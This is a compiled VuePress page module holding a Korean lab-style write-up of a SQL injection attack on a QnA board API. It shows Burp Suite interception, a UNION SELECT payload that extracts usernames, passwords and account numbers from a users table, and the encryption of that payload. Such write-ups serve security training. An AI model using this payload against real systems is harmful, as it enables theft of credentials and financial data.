import{_ as a}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as e,c as s,f as t}from"./app.d51fb666.js";const n={},i=t(`<h1 id="sqli-공격" tabindex="-1"><a class="header-anchor" href="#sqli-공격" aria-hidden="true">#</a> SQLi 공격</h1><h2 id="_1-sqli-공격이란" tabindex="-1"><a class="header-anchor" href="#_1-sqli-공격이란" aria-hidden="true">#</a> 1. SQLi 공격이란?</h2><ul><li>사용자의 입력 값으로 웹 사이트 SQL 쿼리가 완성되는 약점을 이용하며, 입력 값을 변조하여 비정상적인 SQL 쿼리를 조합하거나 실행하는 공격이다.</li><li>해당 취약점이 존재하는 경우 비정상적인 SQL 쿼리로 DBMS 및 데이터(Data)를 열람하거나 조작 가능하므로 사용자의 입력 값에 대한 필터링을 구현하여야 한다.</li></ul><h2 id="_2-공격-방법" tabindex="-1"><a class="header-anchor" href="#_2-공격-방법" aria-hidden="true">#</a> 2. 공격 방법</h2><p>Burp suite로 QnA 게시판(/api/qna/view) 요청을 가로챈다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200977942-95309400-1560-4f96-9c47-bdd4911a10d4.jpg" alt="버프로잡은화면" loading="lazy"></p><p>요청 body의 enc_data를 복호화하면 qna_id가 전달되는 것 확인할 수 있다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200978257-ce5eb74c-c1a8-416d-aac0-81d12b22f093.jpg" alt="qna_id확인" loading="lazy"></p><p>qna_id에 넣을 SQL 쿼리문이다.</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">{</span><span class="token string-property property">&quot;qna_id&quot;</span><span class="token operator">:</span><span class="token string">&quot;false UNION select username as title, password as content, account_number as write_at from users where true LIMIT 1,2; -- &quot;</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Injection할 쿼리문을 포함한 JSON을 암호화한다.</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">&#39;{&quot;qna_id&quot;:&quot;false UNION select username as title, password as content, account_number as write_at from users where true LIMIT 1,2; -- &quot;}&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="https://user-images.githubusercontent.com/115529661/200978302-b40fe385-5de5-4bf0-a091-79cb40fed626.png" alt="쿼리암호화" loading="lazy"></p><p>앞에서 암호화한 데이터를 요청에 넣어 보냈다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200978464-1bf4a821-aa09-4e24-a3c5-5426fad26200.jpg" alt="암호화한 데이터 송신" loading="lazy"></p><p>응답값을 복호화해서 쿼리문 결과 확인할 수 있다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200978704-d8c4e842-44a3-4d0f-a559-07d533e9b402.jpg" alt="결과확인" loading="lazy"></p><p>**암호화,복호화 확인 넣어야함</p>`,18),c=[i];function r(p,o){return e(),s("div",null,c)}const u=a(n,[["render",r],["__file","SQLI.html.vue"]]);export{u as default};
